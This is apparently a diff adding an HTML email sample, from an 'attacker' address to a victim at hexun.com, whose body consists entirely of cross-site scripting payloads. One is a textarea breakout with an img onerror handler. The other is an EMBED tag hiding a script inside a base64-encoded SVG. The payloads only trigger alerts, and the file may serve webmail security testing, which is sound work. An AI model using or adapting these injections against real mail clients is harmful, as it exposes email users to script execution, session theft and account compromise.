@@ -1,0 +1,8 @@
+From: <attacker@attacker.com>
+Subject: hello
+To: victim@hexun.com
+MIME-Version: 1.0
+Content-type: text/html
+
+"></textarea><IMG SRC=1 onerror=alert(/img-src-xss/)>
+"><EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoJ2VtYmVkIHhzcycpOzwvc2NyaXB0Pjwvc3ZnPg==" AllowScriptAccess="always"></EMBED>
